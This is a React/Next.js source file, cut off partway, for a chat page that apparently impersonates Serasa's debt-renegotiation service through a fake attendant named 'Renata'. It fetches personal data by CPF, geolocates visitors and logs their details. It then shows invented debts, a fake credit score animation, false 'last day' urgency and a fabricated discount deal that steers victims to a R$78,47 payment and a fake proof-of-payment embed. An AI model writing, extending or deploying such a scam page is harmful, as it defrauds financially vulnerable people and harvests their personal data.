"use client"

import { Suspense, useState, useEffect, useRef, useCallback } from "react"
import { useSearchParams } from "next/navigation"
import Image from "next/image"
import { Card } from "@/components/ui/card"
import { ShieldCheck, User, Clock, QrCode, CheckCircle2 } from "lucide-react"

function formatCPF(value?: string): string {
  if (!value) return ""
  const numbers = String(value).replace(/\D/g, "")
  if (numbers.length === 11) {
    return numbers.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")
  }
  return value
}

function ModernAudioPlayer({ audioUrl, messageId }: { audioUrl: string; messageId: string }) {
  const [isPlaying, setIsPlaying] = useState(false)
  const [progress, setProgress] = useState(0)
  const [currentTime, setCurrentTime] = useState("0:00")
  const [duration, setDuration] = useState("0:00")
  const [playbackRate, setPlaybackRate] = useState(1)
  const audioRef = useRef<HTMLAudioElement | null>(null)

  useEffect(() => {
    const audio = audioRef.current
    if (!audio) return

    const handleTimeUpdate = () => {
      if (audio.duration) {
        const cur = audio.currentTime
        const dur = audio.duration
        setProgress((cur / dur) * 100)
        const curMins = Math.floor(cur / 60)
        const curSecs = Math.floor(cur % 60).toString().padStart(2, "0")
        setCurrentTime(`${curMins}:${curSecs}`)
      }
    }

    const handleLoadedMetadata = () => {
      if (audio.duration) {
        const durMins = Math.floor(audio.duration / 60)
        const durSecs = Math.floor(audio.duration % 60).toString().padStart(2, "0")
        setDuration(`${durMins}:${durSecs}`)
      }
    }

    const handleEnded = () => {
      setIsPlaying(false)
      setProgress(0)
      setCurrentTime("0:00")
    }

    audio.addEventListener("timeupdate", handleTimeUpdate)
    audio.addEventListener("loadedmetadata", handleLoadedMetadata)
    audio.addEventListener("ended", handleEnded)

    // Attempt auto-play with mute fallback if blocked
    const playPromise = audio.play()
    if (playPromise !== undefined) {
      playPromise
        .then(() => setIsPlaying(true))
        .catch(() => setIsPlaying(false))
    }

    return () => {
      audio.removeEventListener("timeupdate", handleTimeUpdate)
      audio.removeEventListener("loadedmetadata", handleLoadedMetadata)
      audio.removeEventListener("ended", handleEnded)
    }
  }, [audioUrl])

  const togglePlay = () => {
    const audio = audioRef.current
    if (!audio) return
    if (isPlaying) {
      audio.pause()
      setIsPlaying(false)
    } else {
      audio.play().then(() => setIsPlaying(true)).catch(console.error)
    }
  }

  const toggleSpeed = () => {
    const audio = audioRef.current
    if (!audio) return
    const rates = [1, 1.5, 2]
    const nextRate = rates[(rates.indexOf(playbackRate) + 1) % rates.length]
    audio.playbackRate = nextRate
    setPlaybackRate(nextRate)
  }

  const handleSeek = (e: React.MouseEvent<HTMLDivElement>) => {
    const audio = audioRef.current
    if (!audio || !audio.duration) return
    const rect = e.currentTarget.getBoundingClientRect()
    const clickX = e.clientX - rect.left
    const newProgress = Math.max(0, Math.min(1, clickX / rect.width))
    audio.currentTime = newProgress * audio.duration
    setProgress(newProgress * 100)
  }

  const barHeights = [10, 18, 14, 24, 12, 28, 16, 22, 14, 26, 18, 24, 12, 20, 14, 18, 22, 14, 18, 10]

  return (
    <div className="w-full max-w-[280px] sm:max-w-[320px] bg-white rounded-2xl p-3 border border-pink-100 shadow-sm font-sans select-none my-1">
      <audio ref={audioRef} src={audioUrl} preload="auto" data-message-id={messageId} />
      
      <div className="flex items-center justify-between pb-2 mb-2 border-b border-gray-100">
        <div className="flex items-center gap-2">
          <div className="relative">
            <Image
              src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Consultar%20%281%29-7zWzvncMf7yysFX34dXj5McqyxpB5s.png"
              alt="Renata Atendente"
              width={28}
              height={28}
              className="w-7 h-7 rounded-full object-cover border border-pink-200"
            />
            <span className="absolute -bottom-0.5 -right-0.5 w-2 h-2 rounded-full bg-emerald-500 border border-white" />
          </div>
          <div>
            <p className="text-xs font-semibold text-gray-800 leading-tight">Renata - Atendente</p>
            <p className="text-[10px] text-pink-600 font-medium">Mensagem de voz oficial</p>
          </div>
        </div>

        <button
          onClick={toggleSpeed}
          type="button"
          className="text-[10px] font-bold text-gray-500 hover:text-pink-600 bg-gray-100 hover:bg-pink-50 px-2 py-0.5 rounded transition-colors"
          title="Velocidade"
        >
          {playbackRate}x
        </button>
      </div>

      <div className="flex items-center gap-3">
        <button
          onClick={togglePlay}
          type="button"
          className="w-10 h-10 rounded-full bg-pink-600 hover:bg-pink-700 active:scale-95 text-white flex items-center justify-center flex-shrink-0 shadow-md transition-all"
          aria-label={isPlaying ? "Pausar" : "Ouvir"}
        >
          {isPlaying ? (
            <svg className="w-4 h-4 fill-current" viewBox="0 0 24 24">
              <path d="M6 4h4v16H6V4zm8 0h4v16h-4V4z" />
            </svg>
          ) : (
            <svg className="w-4 h-4 fill-current ml-0.5" viewBox="0 0 24 24">
              <path d="M8 5v14l11-7z" />
            </svg>
          )}
        </button>

        <div className="flex-1 cursor-pointer py-1" onClick={handleSeek}>
          <div className="flex items-center justify-between gap-[2px] h-7">
            {barHeights.map((h, i) => {
              const barPercent = (i / barHeights.length) * 100
              const isPassed = barPercent <= progress
              return (
                <div
                  key={i}
                  className={`w-[3px] rounded-full transition-all duration-150 ${
                    isPassed ? "bg-pink-600" : "bg-pink-200"
                  } ${isPlaying && isPassed ? "animate-pulse" : ""}`}
                  style={{ height: `${h}px` }}
                />
              )
            })}
          </div>

          <div className="flex justify-between items-center text-[10px] text-gray-500 font-mono mt-1 px-0.5">
            <span>{isPlaying ? currentTime : (duration !== "0:00" ? duration : "0:25")}</span>
            <span className="text-[9px] text-emerald-600 font-sans font-medium flex items-center gap-0.5">
              <CheckCircle2 className="w-2.5 h-2.5" /> Entregue
            </span>
          </div>
        </div>
      </div>
    </div>
  )
}

function AnimatedScoreGauge({ targetScore = 129 }: { targetScore?: number }) {
  const [currentScore, setCurrentScore] = useState(60)
  const [phase, setPhase] = useState<"rising" | "pause" | "dropping" | "done">("rising")

  useEffect(() => {
    let animFrame: number
    const startTime = performance.now()

    const tick = (now: number) => {
      const elapsed = now - startTime

      if (elapsed < 1400) {
        setPhase("rising")
        const progress = elapsed / 1400
        const ease = 1 - Math.pow(1 - progress, 2)
        const val = Math.round(60 + ease * 720) // sweeps to 780 (green)
        setCurrentScore(val)
        animFrame = requestAnimationFrame(tick)
      } else if (elapsed < 2000) {
        setPhase("pause")
        setCurrentScore(780)
        animFrame = requestAnimationFrame(tick)
      } else if (elapsed < 3200) {
        setPhase("dropping")
        const dropProgress = (elapsed - 2000) / 1200
        const ease = 1 - Math.pow(1 - dropProgress, 3)
        const val = Math.round(780 - ease * (780 - targetScore))
        setCurrentScore(Math.max(targetScore, val))
        animFrame = requestAnimationFrame(tick)
      } else {
        setPhase("done")
        setCurrentScore(targetScore)
      }
    }

    animFrame = requestAnimationFrame(tick)
    return () => cancelAnimationFrame(animFrame)
  }, [targetScore])

  // Seta do velocímetro: -90deg (esquerda/vermelho 0) até +90deg (direita/verde 1000)
  const rotationAngle = -90 + (currentScore / 1000) * 180
  const isRed = phase === "done" || (phase === "dropping" && currentScore <= 350)
  const isGreen = phase === "pause" || (phase === "rising" && currentScore > 650)

  return (
    <div className="w-full max-w-[340px] sm:max-w-[380px] bg-white rounded-2xl border border-red-200 shadow-md overflow-hidden font-sans select-none my-1">
      {/* Header vermelho oficial com carinha triste SVG idêntica à Serasa */}
      <div className="bg-gradient-to-r from-[#ba141a] via-[#b91c1c] to-[#991b1b] text-white px-4 py-3 flex items-center justify-between gap-3">
        <div className="flex-1">
          <h4 className="font-bold text-sm tracking-tight leading-snug">Alto risco para crédito</h4>
          <p className="text-[11px] text-red-100/90 leading-tight mt-0.5">
            Os bancos negam limite de crédito devido ao maior risco de inadimplência
          </p>
        </div>
        <div className="w-10 h-10 rounded-full border-2 border-white/90 flex items-center justify-center flex-shrink-0 bg-white/10 shadow-inner">
          <svg className="w-6 h-6 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
            <circle cx="12" cy="12" r="10" />
            <circle cx="9" cy="9" r="1" fill="currentColor" />
            <circle cx="15" cy="9" r="1" fill="currentColor" />
            <path d="M16 16s-1.5-2-4-2-4 2-4 2" />
          </svg>
        </div>
      </div>

      {/* Speedometer Area */}
      <div className="p-4 bg-white flex flex-col items-center">
        <div className="relative w-56 h-28 flex items-end justify-center overflow-hidden">
          <svg className="w-56 h-56 -mb-28" viewBox="0 0 200 200">
            {/* Trilho de fundo sutil */}
            <path
              d="M 30 100 A 70 70 0 0 1 170 100"
              fill="none"
              stroke="#f1f5f9"
              strokeWidth="18"
              strokeLinecap="round"
            />
            {/* Arcos das 4 faixas de Score Serasa */}
            {/* Red (0-300) */}
            <path
              d="M 30 100 A 70 70 0 0 1 52 47"
              fill="none"
              stroke="#dc2626"
              strokeWidth="16"
              strokeLinecap="round"
            />
            {/* Orange (300-500) */}
            <path
              d="M 57 43 A 70 70 0 0 1 97 30"
              fill="none"
              stroke="#ea580c"
              strokeWidth="16"
            />
            {/* Yellow (500-700) */}
            <path
              d="M 103 30 A 70 70 0 0 1 143 43"
              fill="none"
              stroke="#eab308"
              strokeWidth="16"
            />
            {/* Green (700-1000) */}
            <path
              d="M 148 47 A 70 70 0 0 1 170 100"
              fill="none"
              stroke="#16a34a"
              strokeWidth="16"
              strokeLinecap="round"
            />

            {/* Pivot central multicamada */}
            <circle cx="100" cy="100" r="9" fill="#0f172a" />
            <circle cx="100" cy="100" r="6" fill="#cbd5e1" />
            <circle cx="100" cy="100" r="3" fill="#0f172a" />

            {/* Seta animada com rotação correta (-90° no vermelho até +90° no verde) */}
            <g transform={`rotate(${rotationAngle} 100 100)`}>
              <polygon points="96.5,100 103.5,100 100,28" fill="#0f172a" />
              <polygon points="98,100 102,100 100,22" fill="#dc2626" />
            </g>
          </svg>
        </div>

        {/* Contador dinâmico com animação */}
        <div className="mt-1 text-center">
          <div className="flex items-baseline justify-center gap-1">
            <span
              className={`text-3xl font-black font-mono tracking-tight transition-colors duration-150 ${
                isRed ? "text-slate-900" : isGreen ? "text-emerald-600" : "text-amber-500"
              }`}
            >
              {currentScore}
            </span>
            <span className="text-sm font-bold text-slate-400">/ 1000</span>
          </div>

          <div className="mt-1 flex justify-center">
            <span
              className={`inline-flex items-center gap-1.5 text-xs font-bold px-3 py-0.5 rounded-full uppercase tracking-wider transition-all duration-150 ${
                isRed
                  ? "bg-red-50 text-red-700 border border-red-200"
                  : isGreen
                  ? "bg-emerald-50 text-emerald-700 border border-emerald-200"
                  : "bg-amber-50 text-amber-700 border border-amber-200"
              }`}
            >
              <span className={`w-1.5 h-1.5 rounded-full ${isRed ? "bg-red-600" : isGreen ? "bg-emerald-600" : "bg-amber-600"}`}></span>
              {isRed ? "Score: Baixo" : isGreen ? "Score: Excelente" : "Score: Regular"}
            </span>
          </div>
        </div>
      </div>

      {/* Faixa inferior vermelha oficial Serasa */}
      <div className="h-1.5 bg-[#ba141a] w-full"></div>
    </div>
  )
}

interface Message {
  id: string
  type: "text" | "image" | "audio" | "video" | "embed" | "data-confirmation" | "agreement-document" | "payment-guide" | "score-gauge"
  content: string
  sender: "bot" | "user"
  timestamp: Date
  delay?: number
  buttons?: Array<{
    text: string
    action: string
  }>
  data?: any
  imageUrl?: string
  audioUrl?: string
  videoUrl?: string
  embedUrl?: string
}

interface UserData {
  cpf: string
  nome: string
  nascimento: string
  mae: string
  sexo: string
  cidade: string
}

function ChatContent() {
  const searchParams = useSearchParams()
  const cpf = searchParams.get("cpf")
  const [messages, setMessages] = useState<Message[]>([])
  const [userData, setUserData] = useState<UserData | null>(null)
  const [currentStep, setCurrentStep] = useState(0)
  const [isLoading, setIsLoading] = useState(false)
  const [isTyping, setIsTyping] = useState(false)
  const [clickedButtons, setClickedButtons] = useState<Set<string>>(new Set())
  const [isMounted, setIsMounted] = useState(false)
  const messagesEndRef = useRef<HTMLDivElement>(null)
  const chatContainerRef = useRef<HTMLDivElement>(null)
  const isInitializedRef = useRef(false)
  const hasStartedConversationRef = useRef(false)
  const queuedMessageIdsRef = useRef<Set<string>>(new Set())
  const activeTimeoutsRef = useRef<NodeJS.Timeout[]>([])

  const scrollToBottom = useCallback((behavior: ScrollBehavior = "smooth") => {
    if (chatContainerRef.current) {
      chatContainerRef.current.scrollTo({
        top: chatContainerRef.current.scrollHeight,
        behavior,
      })
    }

    if (messagesEndRef.current) {
      try {
        messagesEndRef.current.scrollIntoView({
          behavior,
          block: "end",
          inline: "nearest",
        })
      } catch {
        messagesEndRef.current.scrollIntoView(false)
      }
    }

    if (typeof window !== "undefined") {
      const docHeight = Math.max(
        document.documentElement.scrollHeight,
        document.body.scrollHeight
      )
      window.scrollTo({
        top: docHeight,
        behavior,
      })
    }
  }, [])

  useEffect(() => {
    setIsMounted(true)

    const originalOverflow = document.body.style.overflow
    const originalOverscroll = document.body.style.overscrollBehavior
    document.body.style.overflow = "hidden"
    document.body.style.overscrollBehavior = "none"

    return () => {
      document.body.style.overflow = originalOverflow
      document.body.style.overscrollBehavior = originalOverscroll
      activeTimeoutsRef.current.forEach(clearTimeout)
      activeTimeoutsRef.current = []
    }
  }, [])

  useEffect(() => {
    scrollToBottom("smooth")

    const t1 = setTimeout(() => scrollToBottom("smooth"), 80)
    const t2 = setTimeout(() => scrollToBottom("smooth"), 250)
    const t3 = setTimeout(() => scrollToBottom("smooth"), 500)
    const t4 = setTimeout(() => scrollToBottom("smooth"), 900)

    return () => {
      clearTimeout(t1)
      clearTimeout(t2)
      clearTimeout(t3)
      clearTimeout(t4)
    }
  }, [messages, isTyping, scrollToBottom])

  useEffect(() => {
    const container = chatContainerRef.current
    if (!container || typeof ResizeObserver === "undefined") return

    let resizeTimer: NodeJS.Timeout
    const observer = new ResizeObserver(() => {
      clearTimeout(resizeTimer)
      resizeTimer = setTimeout(() => {
        scrollToBottom("smooth")
      }, 60)
    })

    observer.observe(container)

    return () => {
      observer.disconnect()
      clearTimeout(resizeTimer)
    }
  }, [scrollToBottom])

  useEffect(() => {
    if (!cpf) return
    if (isInitializedRef.current) return
    isInitializedRef.current = true

    initializeChatbot()
  }, [cpf])

  const initializeChatbot = async () => {
    setIsLoading(true)

    const paramNome = searchParams.get("nome") || (typeof window !== "undefined" ? localStorage.getItem("serasa_nome") : null) || ""
    const paramNasc = searchParams.get("nasc") || (typeof window !== "undefined" ? localStorage.getItem("serasa_nasc") : null) || ""
    const paramCidade = searchParams.get("cidade") || searchParams.get("city") || (typeof window !== "undefined" ? localStorage.getItem("serasa_cidade") : null) || ""

    // Fast client-side IP geolocation lookup
    let clientCity = paramCidade
    if (!clientCity) {
      try {
        const geoController = new AbortController()
        const geoTimeout = setTimeout(() => geoController.abort(), 2000)
        const geoRes = await fetch("https://ipwho.is/", { signal: geoController.signal, cache: "no-store" })
        clearTimeout(geoTimeout)
        if (geoRes.ok) {
          const geoData = await geoRes.json()
          if (geoData && geoData.success && geoData.city) {
            clientCity = String(geoData.city).trim()
          }
        }
      } catch {
        // Silent fallback
      }
    }

    if (!clientCity) {
      try {
        const geo2 = await fetch("http://ip-api.com/json/", { cache: "no-store" })
        if (geo2.ok) {
          const d2 = await geo2.json()
          if (d2 && d2.city) clientCity = String(d2.city).trim()
        }
      } catch {}
    }

    try {
      const cleanCpf = cpf?.replace(/\D/g, "")

      const response = await fetch(`/api/user-data?cpf=${cleanCpf}${clientCity ? `&cidade=${encodeURIComponent(clientCity)}` : ""}`)
      const result = await response.json()

      const serverCity = result.data?.cidade && result.data.cidade !== "São Paulo" ? result.data.cidade : ""
      const detectedCity = clientCity || serverCity || "Fortaleza"

      const userData: UserData = {
        cpf: cpf || "",
        nome: (result.data?.nome && result.data.nome !== "Cliente") ? result.data.nome : (paramNome || "Cliente"),
        nascimento: result.data?.nascimento || paramNasc || "",
        mae: result.data?.mae || "",
        sexo: result.data?.sexo || "",
        cidade: detectedCity,
      }

      setUserData(userData)

      logUserInteraction(userData.cpf, "chat_started", { city: detectedCity, userData })

      startConversation(userData)

      if (!result.success) {
        console.log("Using fallback or pre-fetched data")
      }
    } catch (error) {
      console.error("Error fetching user data:", error)
      const fallbackData: UserData = {
        cpf: cpf || "",
        nome: paramNome || "Cliente",
        nascimento: paramNasc || "",
        mae: "",
        sexo: "",
        cidade: clientCity || "Fortaleza",
      }
      setUserData(fallbackData)
      startConversation(fallbackData)
    }

    setIsLoading(false)
  }

  const addMessageWithTyping = (message: Message, delay = 2000) => {
    if (queuedMessageIdsRef.current.has(message.id)) return
    queuedMessageIdsRef.current.add(message.id)

    const t1 = setTimeout(() => {
      setIsTyping(true)
      const t2 = setTimeout(() => {
        setIsTyping(false)
        setMessages((prev) => {
          if (prev.some((m) => m.id === message.id)) return prev
          return [...prev, message]
        })

        if (message.type === "audio" && message.audioUrl) {
          const t3 = setTimeout(() => {
            const audioElement = document.querySelector(`audio[data-message-id="${message.id}"]`) as HTMLAudioElement
            if (audioElement) {
              audioElement.play().catch(console.error)
            }
          }, 100)
          activeTimeoutsRef.current.push(t3)
        }
      }, delay)
      activeTimeoutsRef.current.push(t2)
    }, 100)
    activeTimeoutsRef.current.push(t1)
  }

  const startConversation = (userData: UserData) => {
    if (hasStartedConversationRef.current) return
    hasStartedConversationRef.current = true

    const firstName = userData.nome.split(" ")[0]

    const firstImage: Message = {
      id: "0",
      type: "image",
      content: "",
      sender: "bot",
      timestamp: new Date(),
      imageUrl:
        "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/t2s1f0xeh3om35z9nrjnb7jf-1vA424t6Q2p1WLQkyWMXU5Hymibj8F.png",
    }

    addMessageWithTyping(firstImage, 2000)

    const initialMessages: Message[] = [
      {
        id: "1",
        type: "text",
        content: `Uma atendente de ${userData.cidade || "sua região"} entrou na conversa.`,
        sender: "bot",
        timestamp: new Date(),
      },
      {
        id: "2",
        type: "text",
        content: `Olá, ${firstName}!\nMe chamo Renata, serei sua atendente hoje na Serasa.`,
        sender: "bot",
        timestamp: new Date(),
      },
      {
        id: "3",
        type: "text",
        content: "Vou consultar gratuitamente as ofertas disponíveis para você!",
        sender: "bot",
        timestamp: new Date(),
      },
      {
        id: "4",
        type: "text",
        content: "Estou verificando seus dados, Aguarde...",
        sender: "bot",
        timestamp: new Date(),
      },
    ]

    setTimeout(() => {
      initialMessages.forEach((message, index) => {
        setTimeout(() => {
          addMessageWithTyping(message, 2000)

          if (message.id === "4") {
            setTimeout(() => {
              const fingerprintImage: Message = {
                id: "fingerprint-scan",
                type: "image",
                content: "",
                sender: "bot",
                timestamp: new Date(),
                imageUrl:
                  "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/r03zqdcbcd7t0h9lsuxzcl9r-vIo2YPaLzCQIS3i6lRL3cQtDh4RSB4.gif",
              }
              addMessageWithTyping(fingerprintImage, 2000)

              setTimeout(() => {
                const dataVerified: Message = {
                  id: "data-verified",
                  type: "text",
                  content: "Dados verificados com sucesso...",
                  sender: "bot",
                  timestamp: new Date(),
                }
                addMessageWithTyping(dataVerified, 2000)

                setTimeout(() => {
                  addDataConfirmationMessage(userData)
                }, 4000)
              }, 4000)
            }, 4000)
          }
        }, index * 3000)
      })
    }, 4000)
  }

  const addDataConfirmationMessage = (userData: UserData) => {
    const confirmationMessage: Message = {
      id: "data-confirmation",
      type: "data-confirmation",
      content: "Dados verificados com sucesso...\n\nAntes de prosseguirmos, confirme se seus dados estão corretos:",
      sender: "bot",
      timestamp: new Date(),
      data: userData,
      buttons: [
        {
          text: "CONFIRMAR",
          action: "confirm-data",
        },
      ],
    }

    setMessages((prev) => {
      if (prev.some((m) => m.id === confirmationMessage.id)) return prev
      return [...prev, confirmationMessage]
    })
  }

  const logUserInteraction = async (cpf: string, action: string, data: any) => {
    try {
      console.log("[v0] Sending log:", { cpf, action, data })

      const response = await fetch("/api/logs", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          cpf,
          action,
          data,
          timestamp: new Date().toISOString(),
        }),
      })

      const result = await response.json()
      console.log("[v0] Log response:", result)

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`)
      }
    } catch (error) {
      console.error("[v0] Error logging interaction:", error)
    }
  }

  const handleButtonClick = (action: string, buttonText: string) => {
    const buttonId = `${action}-${buttonText}`
    if (clickedButtons.has(buttonId)) return
    setClickedButtons((prev) => new Set([...prev, buttonId]))

    const userMessage: Message = {
      id: `user-${Date.now()}`,
      type: "text",
      content: buttonText,
      sender: "user",
      timestamp: new Date(),
    }

    setMessages((prev) => [...prev, userMessage])

    logUserInteraction(userData?.cpf || "", `button_clicked_${action}`, { buttonText })

    setTimeout(() => {
      switch (action) {
        case "confirm-data":
          continueAfterDataConfirmation()
          break
        case "quero-consultar":
          startDebtAnalysis()
          break
        case "sim-desejo":
          checkAgreements()
          break
        case "sim-quitar":
          confirmAgreement()
          break
        case "acessar-pagamento":
          redirectToPayment()
          break
      }
    }, 1500)
  }

  const continueAfterDataConfirmation = () => {
    const firstName = userData?.nome.split(" ")[0] || "Usuário"

    const nextMessages: Message[] = [
      {
        id: "welcome",
        type: "text",
        content: `${firstName}, seja bem-vindo(a) ao atendimento Feirão Limpa Nome da Serasa!`,
        sender: "bot",
        timestamp: new Date(),
      },
      {
        id: "protocol",
        type: "text",
        content: "Protocolo do atendimento: AMY3PK8JS",
        sender: "bot",
        timestamp: new Date(),
      },
    ]

    nextMessages.forEach((message, index) => {
      setTimeout(
        () => {
          addMessageWithTyping(message, 2000)

          if (message.id === "protocol") {
            setTimeout(() => {
              const lastDayBanner: Message = {
                id: "last-day-banner",
                type: "image",
                content: "",
                sender: "bot",
                timestamp: new Date(),
                imageUrl:
                  "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/imagem-2025-06-02-220849093-gXe5072GbkjqMj6qzHzucTqlxbPp7S.png",
              }
              addMessageWithTyping(lastDayBanner, 2000)

              setTimeout(() => {
                const lastDayMessage: Message = {
                  id: "last-day",
                  type: "text",
                  content:
                    `Último dia do Feirão limpa nome em ${userData?.cidade || "sua região"}.\n\nDeseja consultar as ofertas disponíveis para o seu CPF?`,
                  sender: "bot",
                  timestamp: new Date(),
                  buttons: [
                    {
                      text: "Quero Consultar",
                      action: "quero-consultar",
                    },
                  ],
                }
                addMessageWithTyping(lastDayMessage, 2000)
              }, 4000)
            }, 4000)
          }
        },
        (index + 1) * 3000,
      )
    })
  }

  const startDebtAnalysis = () => {
    const analysisMessage: Message = {
      id: "analyzing",
      type: "text",
      content: "Por favor, aguarde enquanto analiso a situação de seu CPF em nossos sistemas..",
      sender: "bot",
      timestamp: new Date(),
    }

    addMessageWithTyping(analysisMessage, 2000)

    setTimeout(() => {
      const animatedGif: Message = {
        id: "financial-life-gif",
        type: "image",
        content: "",
        sender: "bot",
        timestamp: new Date(),
        imageUrl:
          "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/yvu93mi2pr47dwsd6utu3bwn-1-eYO2cEVEgAqrnd0TU6SrdJefLEVp1L.gif",
      }
      addMessageWithTyping(animatedGif, 2000)

      setTimeout(() => {
        const analysisComplete: Message = {
          id: "analysis-complete",
          type: "text",
          content: "Análise concluída!",
          sender: "bot",
          timestamp: new Date(),
        }
        addMessageWithTyping(analysisComplete, 2000)

        setTimeout(() => {
          showDebtResults()
        }, 4000)
      }, 4000)
    }, 4000)
  }

  const showDebtResults = () => {
    const firstName = userData?.nome.split(" ")[0] || "Usuário"
    const cpfFormatted = userData?.cpf || ""

    const debtMessage: Message = {
      id: "debt-results",
      type: "text",
      content: `${firstName}, identifiquei aqui 3 dívidas ativas no sistema.\n\nOs valores variam entre R$528,74 a R$5.237,78\nTotalizando uma dívida ativa de R$7.566,52 em seu CPF.\n\nSituação para o CPF ${cpfFormatted}: NEGATIVADO.\n\nDevido a alta taxa de Juros imposta pelo governo, suas dívidas estão se multiplicando rapidamente!`,
      sender: "bot",
      timestamp: new Date(),
    }

    addMessageWithTyping(debtMessage, 2000)

    setTimeout(() => {
      const firstAudio: Message = {
        id: "first-audio",
        type: "audio",
        content: "",
        sender: "bot",
        timestamp: new Date(),
        audioUrl:
          "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/g03ygdj5oj1kuc1smp1cgx2x-itY8rQg5gU2qFuOzIVmpAr4U30WfQx.mp3",
      }
      addMessageWithTyping(firstAudio, 2000)

      setTimeout(() => {
        const creditScoreImage: Message = {
          id: "credit-score",
          type: "score-gauge",
          content: "",
          sender: "bot",
          timestamp: new Date(),
          data: {
            targetScore: 129,
          },
        }
        addMessageWithTyping(creditScoreImage, 2000)

        setTimeout(() => {
          const verificationQuestion: Message = {
            id: "verification-question",
            type: "text",
            content: "Deseja verificar se existe algum acordo disponível para você?",
            sender: "bot",
            timestamp: new Date(),
            buttons: [
              {
                text: "Sim, Desejo",
                action: "sim-desejo",
              },
            ],
          }
          addMessageWithTyping(verificationQuestion, 2000)
        }, 4000)
      }, 7000)
    }, 4000)
  }

  const checkAgreements = () => {
    const searchingMessage: Message = {
      id: "searching-agreements",
      type: "text",
      content: "Aguarde um instante enquanto verifico aqui no sistema se existem acordos disponíveis para você...",
      sender: "bot",
      timestamp: new Date(),
    }

    addMessageWithTyping(searchingMessage, 2000)

    setTimeout(() => {
      const checkmarkImage: Message = {
        id: "checkmark",
        type: "image",
        content: "",
        sender: "bot",
        timestamp: new Date(),
        imageUrl:
          "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Capturar2-Us2rfDwlpKeS7ZMXvmETuwpsIJ4PbM.png",
      }
      addMessageWithTyping(checkmarkImage, 2000)

      setTimeout(() => {
        const newsMessage: Message = {
          id: "news",
          type: "text",
          content:
            "Notícia: Somente hoje, mais de 12.872,00 brasileiros negociaram suas dívidas no Feirão Limpa Nome Serasa online!",
          sender: "bot",
          timestamp: new Date(),
        }
        addMessageWithTyping(newsMessage, 2000)

        setTimeout(() => {
          const videoEmbed: Message = {
            id: "video-embed",
            type: "video",
            content: "",
            sender: "bot",
            timestamp: new Date(),
            videoUrl: "https://player.vimeo.com/video/1032300787?badge=0&autopause=0&player_id=0&app_id=58479",
          }
          addMessageWithTyping(videoEmbed, 2000)

          setTimeout(() => {
            showAgreementDetails()
          }, 18000)
        }, 4000)
      }, 4000)
    }, 4000)
  }

  const showAgreementDetails = () => {
    const agreementFound: Message = {
      id: "agreement-found",
      type: "text",
      content:
        "Acordo encontrado!\n\n1 (um) acordo foi encontrado para:\n\n" + `${userData?.nome} (CPF ${userData?.cpf})`,
      sender: "bot",
      timestamp: new Date(),
    }

    addMessageWithTyping(agreementFound, 2000)

    setTimeout(() => {
      const accessingAgreement: Message = {
        id: "accessing-agreement",
        type: "text",
        content: "Acessando o acordo, 83N2L618362E aguarde...",
        sender: "bot",
        timestamp: new Date(),
      }
      addMessageWithTyping(accessingAgreement, 2000)

      setTimeout(() => {
        const today = new Date().toLocaleDateString("pt-BR")
        const agreementInfo: Message = {
          id: "agreement-info",
          type: "agreement-document",
          content: "",
          sender: "bot",
          timestamp: new Date(),
          data: {
            acordoId: "83N2L618362E",
            nome: userData?.nome,
            cpf: userData?.cpf,
            valorDivida: "7.566,52",
            valorContrato: "78,47",
            desconto: "98,7",
            valorDesconto: "7.488,05",
            vencimento: today,
          },
        }
        addMessageWithTyping(agreementInfo, 2000)

        setTimeout(() => {
          const appInterfaceImage: Message = {
            id: "debt-offers-app",
            type: "image",
            content: "",
            sender: "bot",
            timestamp: new Date(),
            imageUrl:
              "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Capturar23-wU6nxu4g2IZVPqWygtLdlJaJQNbI6e.png",
          }
          addMessageWithTyping(appInterfaceImage, 2000)

          setTimeout(() => {
            const secondAudio: Message = {
              id: "second-audio",
              type: "audio",
              content: "",
              sender: "bot",
              timestamp: new Date(),
              audioUrl:
                "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/xurd2lz77g2r2cypw37j1wab-nu5w6XH0ufVUnH7S5ZN2FBAPUVGMgr.mp3",
            }
            addMessageWithTyping(secondAudio, 2000)

            setTimeout(() => {
              const finalQuestion: Message = {
                id: "final-question",
                type: "text",
                content: "Deseja realizar o acordo e ter seu nome limpo ainda hoje?",
                sender: "bot",
                timestamp: new Date(),
                buttons: [
                  {
                    text: "Sim, desejo quitar minhas dívidas.",
                    action: "sim-quitar",
                  },
                ],
              }
              addMessageWithTyping(finalQuestion, 2000)
            }, 21000)
          }, 4000)
        }, 4000)
      }, 4000)
    }, 4000)
  }

  const confirmAgreement = () => {
    const confirmingMessage: Message = {
      id: "confirming",
      type: "text",
      content: "Confirmando o acordo...",
      sender: "bot",
      timestamp: new Date(),
    }

    addMessageWithTyping(confirmingMessage, 2000)

    setTimeout(() => {
      const serasaInfo: Message = {
        id: "serasa-info",
        type: "text",
        content: `SERASA INFORMA:\nAo efetuar o pagamento do acordo, todas as dívidas em aberto no CPF ${userData?.cpf} serão removidas em 1 hora, e você terá o seu nome limpo novamente!`,
        sender: "bot",
        timestamp: new Date(),
      }
      addMessageWithTyping(serasaInfo, 2000)

      setTimeout(() => {
        const congratulations: Message = {
          id: "congratulations",
          type: "text",
          content: "Parabéns!\nSeu acordo foi confirmado.",
          sender: "bot",
          timestamp: new Date(),
        }
        addMessageWithTyping(congratulations, 2000)

        setTimeout(() => {
          const paymentProofEmbed: Message = {
            id: "payment-proof-embed",
            type: "embed",
            content: "",
            sender: "bot",
            timestamp: new Date(),
            embedUrl: `https://cerulean-bavarois-8fa9a8.netlify.app/proof-2/?name=${encodeURIComponent(userData?.nome || "")}&cpf=${encodeURIComponent(userData?.cpf || "")}&value=78,47`,
          }
          addMessageWithTyping(paymentProofEmbed, 3000)

          setTimeout(() => {
            const paymentGenerated: Message = {
              id: "payment-generated",
              type: "payment-guide",
              content: `A guia de pagamento foi gerada para o acordo 83N2L618362E!`,
              sender: "bot",
              timestamp: new Date(),
              data: {
